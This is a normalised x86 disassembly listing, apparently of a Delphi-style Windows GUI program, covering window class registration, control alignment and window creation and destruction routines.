push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_437714
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_437743 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_4377cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_437fc0
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_413898
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4139f4
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_43738c
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_437f84
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_413a70
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4139f4
mov edx eax
mov ecx ebx
mov eax edi
call sub_437300
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_43793c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_437fc0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_437f84
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_437f84
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_437990
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_43793c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_437a6f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4377cc
pop ecx
push ebp
mov al 0x2
call sub_4377cc
pop ecx
push ebp
mov al 0x3
call sub_4377cc
pop ecx
push ebp
mov al 0x4
call sub_4377cc
pop ecx
push ebp
mov al 0x5
call sub_4377cc
pop ecx
push ebp
mov al 0x6
call sub_4377cc
pop ecx
push ebp
xor eax eax
call sub_4377cc
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_4032f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_4032f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_437a94
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43b594
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_437b28
xor eax eax
push ebp
push sub_437b1b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_437b30
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_437b58
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_437c1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_434494
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_437fc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437c24
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_437f84
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413898
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_434200
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4139f4
xor ecx ecx
mov edx 0xb03e
call sub_435c5c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_437f84
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_437c2c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_437fc0
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_437b28
xor edx edx
push ebp
push sub_437d13
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_437fc0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_4032f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437f84
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413898
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_4139f4
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4030f8
mov eax [ ebp - 0x4 ]
call sub_437b30
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437f84
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_433fa4
mov dl 0x4
call sub_433fa4
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_4138e4
sub_437d80
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44b71c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_44f440
sub_437da0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_433384
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_433384
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_433384
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_437dec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_4333ac
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_4333ac
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_4333ac
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_437e34
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4032f4
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_435c5c
mov edx ebx
mov eax edi
call sub_437da0
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_435c5c
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_435c5c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_435c5c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_435c5c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_435c5c
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax edi
call sub_43b594
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_435c5c
mov eax edi
call sub_438984
jmp r-xdata
mov edx ebx
mov eax edi
call sub_437a94
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437f08
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_435c5c
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax esi
call sub_43b594
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_437d80
mov eax ebp
call sub_4387e8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_437dec
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_435c5c
mov eax esi
call sub_437b50
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_434ed8
sub_437f84
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_4139f4
mov edx edi
mov eax ebp
call sub_4139f4
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_437fe0
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_437fc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_437f84
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_438020
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_437fe0
add esp 0x10
retn
sub_438048
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_4380b4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4350ec
test al al
je r-xdata
mov eax ebx
call sub_43511c
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_4032f4
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_4032f4
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_4032f4
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_43811c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43823a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402b04
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4380b4
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_43b290
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403048
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404118
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438241
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_438248
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_438409
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_431884
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_431884
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40c724
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40c724
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_40861c
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_43b5a0
push 0x1
mov eax [ esi + 0x68 ]
call sub_41cd3c
mov ecx eax
mov edx 0x30
mov eax esi
call sub_435c5c
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_43b290
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438410
lea eax [ ebp - 0xc0 ]
call sub_403eb4
retn
mov eax esi
mov si 0xffee
call sub_4032f4
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_438418
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_4067dc
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_438458
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417c64
mov eax esi
call sub_417bb4
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_417bb4
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_417c6c
pop esi
pop ebx
retn
sub_438490
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_4194b0
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41943c
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41943c
mov eax esi
call sub_4194b8
add esp 0x10
pop esi
pop ebx
retn
sub_4384f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_4384e4
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4139f4
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4139f4
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_4385d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_435f94
mov eax [ ebp - 0x8 ]
push eax
push sub_438458
mov eax [ ebp - 0x8 ]
push eax
push sub_438490
push ebp
call sub_4384f8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43862c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_434a04
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_4085d0
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_4085e4
mov ecx eax
mov edx edi
mov eax ebx
call sub_434a14
mov eax r-xdata
call sub_4085f0
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_4334b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_438684
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_4386d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4386d8
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40c724
sub_4386e8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_413a50
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_4139f4
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_438730
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_437fc0
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_4386e8
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_437f84
call sub_4340e4
inc edi
dec esi
jne r-xdata
sub_4387cc
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
